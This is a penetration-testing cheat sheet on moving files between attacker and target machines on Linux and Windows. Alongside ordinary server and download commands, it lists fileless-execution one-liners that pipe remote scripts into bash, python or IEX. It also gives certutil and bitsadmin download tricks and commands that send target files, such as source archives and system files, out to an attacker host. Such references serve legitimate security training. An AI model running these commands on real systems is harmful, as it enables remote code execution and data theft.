---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# File Transfers

{% hint style="danger" %}
Misc, Protected and over HTTP(S) file transfers to be added.
{% endhint %}

## Linux

### Servers

HTTP

{% tabs %}
{% tab title="Python3" %}
```bash
python3 -m http.server
```
{% endtab %}

{% tab title="Python2.7" %}
```bash
python2.7 -m SimpleHTTPServer
```
{% endtab %}

{% tab title="PHP" %}
```bash
php -S 0.0.0.0:8000
```
{% endtab %}

{% tab title="Ruby" %}
```bash
ruby -run -ehttpd . -p8000
```
{% endtab %}
{% endtabs %}

Servers for uploading files to.

{% tabs %}
{% tab title="Python3 (HTTP)" %}
```bash
python3 -m uploadserver
```
{% endtab %}

{% tab title="Python3 (HTTPS)" %}
{% code overflow="wrap" %}
```bash
# create self-signed cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# create and move to webroot (must be different dir from the cert)
mkdir https && cd https
# start web server using the cert
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
# upload from the target
curl -X POST https://10.10.10.10/upload -F 'files=@file1' -F 'files=@file1' --insecure 
```
{% endcode %}
{% endtab %}

{% tab title="netcat" %}
```bash
nc -lvnp 1337
```
{% endtab %}

{% tab title="FTP" %}
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
{% endtab %}
{% endtabs %}

**SMB**

{% tabs %}
{% tab title="1. Server" %}
```bash
# unauthenticated
sudo impacket-smbserver share -smb2support /
# authenticated
sudo impacket-smbserver share -smb2support / -user test -password test
```
{% endtab %}

{% tab title="2. Connect" %}
```sh
net use z: \\<IP>\share
net use z: \\<IP>\share /user:test test
```
{% endtab %}

{% tab title="3. Transfer" %}
```sh
copy <FILE> z:\
```
{% endtab %}
{% endtabs %}

**WebDav server**

{% tabs %}
{% tab title="1. Server" %}
```bash
# install libraries
sudo pip install wsgidav cheroot
# start server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
{% endtab %}

{% tab title="2. Browse" %}
<pre class="language-sh"><code class="lang-sh"><strong>dir \\&#x3C;IP>\DavWWWRoot
</strong></code></pre>
{% endtab %}

{% tab title="3. Transfer" %}
```sh
copy C:\Windows\Temp\<FILE> \\<IP>\DavWWWRoot\
```
{% endtab %}
{% endtabs %}

### Downloads

{% tabs %}
{% tab title="wget" %}
```bash
wget http://10.10.10.10/file1 -O file1
```
{% endtab %}

{% tab title="cURL" %}
```bash
curl http://10.10.10.10/file1 -o file1
```
{% endtab %}

{% tab title="scp" %}
```bash
scp user@172.16.10.10:/tmp/file1 ./file1
```
{% endtab %}
{% endtabs %}

Fileless execution.

{% tabs %}
{% tab title="cURL" %}
{% code overflow="wrap" %}
```bash
curl https://172.16.10.1/script.sh | bash
```
{% endcode %}
{% endtab %}

{% tab title="wget" %}
```bash
# -q: quiet mode
# -O: specifies the output, -O-: redirect output to stdout
wget -qO- https://172.16.10.1/script.py | python3
```
{% endtab %}

{% tab title="/dev/tcp" %}
```bash
# connect to the target webserver
exec 3<>/dev/tcp/10.10.10.32/80
# HTTP GET request
echo -e "GET /script.sh HTTP/1.1\n\n">&3
# print the response
cat <&3
```
{% endtab %}
{% endtabs %}

### Uploads

{% tabs %}
{% tab title="scp" %}
```bash
scp file1 user@172.16.10.10:/tmp/file1
```
{% endtab %}
{% endtabs %}

## Windows

### Servers

{% tabs %}
{% tab title="SMB" %}
Create an SMB share:

```powershell
# Create a new share
> New-SmbShare -Name "shared" -Path "C:\Users\x7331" -FullAccess "Everyone"

Name   ScopeName Path            Description
----   --------- ----            -----------
shared *         C:\Users\x7331

# Confirm the share is up
> Get-SmbShare

Name   ScopeName Path            Description
----   --------- ----            -----------
ADMIN$ *         C:\Windows      Remote Admin
C$     *         C:\             Default share
IPC$   *                         Remote IPC
shared *         C:\Users\x7331
```

Access it from the target via File Explorer at `\\10.10.10.10\shared`.
{% endtab %}

{% tab title="WebDav (SMB over HTTP)" %}
```powershell
# to a Linux WebDav server
copy C:\Users\john\Desktop\SourceCode.zip \\10.10.10.10\DavWWWRoot\
```
{% endtab %}
{% endtabs %}

### Downloads

{% tabs %}
{% tab title="wget" %}
```powershell
wget http://10.10.10.10/file1 -O file1
```
{% endtab %}

{% tab title="cURL" %}
```powershell
curl http://10.10.10.10/file1 -o file1
```
{% endtab %}

{% tab title="IWR" %}
```powershell
Invoke-WebRequest https://10.10.10.10/file1 -OutFile file1
```
{% endtab %}

{% tab title="bitsadmin" %}
```powershell
bitsadmin /transfer n http://10.10.10.10/file1 C:\Temp\file1
```
{% endtab %}

{% tab title="certutils" %}
```powershell
certutil.exe -verifyctl -split -f http://10.10.10.10/file1
```
{% endtab %}

{% tab title="PHP" %}
{% code overflow="wrap" %}
```powershell
php -r '$file = file_get_contents("https://10.10.10.10/file1"); file_put_contents("$file",file1);'
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Net.WebClient" %}
{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file1','c:\temp\file1')
```
{% endcode %}
{% endtab %}

{% tab title="scp" %}
```powershell
scp user@172.16.10.10:/tmp/file1 c:\temp\file1
```
{% endtab %}

{% tab title="SMB" %}
```
# unauthenticated
copy \\10.10.10.10\share\file1
# authenticated
# connect to the share
net use n: \\10.10.10.10\share /user:test test
# transfer
copy n:\file1
```
{% endtab %}
{% endtabs %}

Fileless execution:

{% tabs %}
{% tab title="IEX" %}
{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file1','c:\temp\file1') | IEX
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Uploads

{% tabs %}
{% tab title="IWR" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># encode file
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:\temp\file1' -Encoding Byte))
<strong># upload file
</strong>Invoke-WebRequest -Uri http://10.10.10.10 -Method POST -Body $b64
</code></pre>
{% endtab %}

{% tab title="FTP" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
</strong></code></pre>
{% endtab %}

{% tab title="scp" %}
```powershell
scp C:\Temp\file1 user@10.10.10.10:/tmp/file1
```
{% endtab %}
{% endtabs %}

## Misc

### b64

{% tabs %}
{% tab title="Windows to Linux" %}
```powershell
# encode file on Windows
[Convert]::ToBase64String((Get-Content -path "c:\temp\file1" -Encoding byte))
# copy the output and decode it on Linux
echo IyBDb3B5...YWxob3N0DQo= | base64 -d > file1
```
{% endtab %}

{% tab title="Linux to Windows" %}
{% code overflow="wrap" %}
```bash
# encode file (-w --> wrap, use 0 to disable line wrapping)
cat file1 | base64 -w 0;echo
# decode on PowerShell
[IO.File]::WriteAllBytes("c:\temp\file1", [Convert]::FromBase64String("LS0tL...0tLQo="))
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Linux

{% tabs %}
{% tab title="Python3 Upload" %}
{% code overflow="wrap" %}
```bash
# starting an uploadserver
python3 -m uploadserver 
# uploading a file
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("file1","rb")})'
```
{% endcode %}
{% endtab %}

{% tab title="Python Download" %}
{% code overflow="wrap" %}
```bash
# python2.7
python2.7 -c 'import urllib;urllib.urlretrieve ("https://script.sh", "script.sh")'
# python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://script.sh", "script.sh")'
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="PHP Download (1)" %}
{% code overflow="wrap" %}
```bash
php -r '$file = file_get_contents("https://10.10.10.10/script.sh"); file_put_contents("script.sh",$file);'
```
{% endcode %}
{% endtab %}

{% tab title="PHP Download (2)" %}
{% code overflow="wrap" %}
```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://10.10.10.10/script.sh", "rb"); $flocal = fopen("script.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
{% endcode %}
{% endtab %}

{% tab title="PHP Fileless Execution" %}
{% code overflow="wrap" %}
```bash
php -r '$lines = @file("https://10.10.10.10/script.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="PERL" %}
{% code overflow="wrap" %}
```bash
perl -e 'use LWP::Simple; getstore("https://10.10.10.10/script.sh", "script.sh");'
```
{% endcode %}
{% endtab %}

{% tab title="Ruby" %}
{% code overflow="wrap" %}
```bash
ruby -e 'require "net/http"; File.write("script.sh", Net::HTTP.get(URI.parse("https://10.10.10.10/script.sh")))'
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Windows

{% tabs %}
{% tab title="1. JS -> Create Script" %}
```javascript
# create a file called `wget.js`
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
{% endtab %}

{% tab title="2. CMD/PS -> Execute Script" %}
{% code overflow="wrap" %}
```powershell
# execute script
cscript.exe /nologo wget.js https://10.10.10.10/script.ps1 script.ps1
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="1. VBScript -> Create Script" %}
```vba
# create a file called `wget.vbs`
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
{% endtab %}

{% tab title="2. CMD/PS -> Execute Script" %}
{% code overflow="wrap" %}
```powershell
# execute script
cscript.exe /nologo wget.vbs https://10.10.10.10/script.ps1 script.ps1
```
{% endcode %}
{% endtab %}
{% endtabs %}
